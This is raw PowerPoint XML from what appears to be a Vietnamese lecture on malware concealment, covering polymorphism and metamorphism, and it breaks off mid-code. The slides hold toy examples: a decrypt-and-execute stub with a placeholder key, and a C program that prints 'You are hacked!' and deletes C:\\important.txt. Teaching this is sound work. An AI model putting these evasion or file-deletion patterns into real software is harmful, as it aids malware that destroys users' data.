              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>			</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chạy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30267112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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Polymorphism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</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Phiên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bản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lây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lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>unsigned char </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encrypted_payload[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0x9F, 0x12, 0x33, ...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>decrypt_and_run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    AES_decrypt(encrypted_payload, key="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>randomKey123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    execute(encrypted_payload);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18652627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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Polymorphism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Điểm chung: Payload chính (in “You are hacked!”) không đổi.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF00FF"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Điểm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>khác: Mỗi bản sao dùng thuật toán/khóa mã hóa khác </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nhau</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nên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chữ ký nhị phân (binary signature) thay đổi hoàn toàn.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3242604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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphism:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lần 1 (phiên bản gốc):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>&lt;stdio.h&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>&lt;stdlib.h&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>You are hacked!\n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>remove("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>C:\\important.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
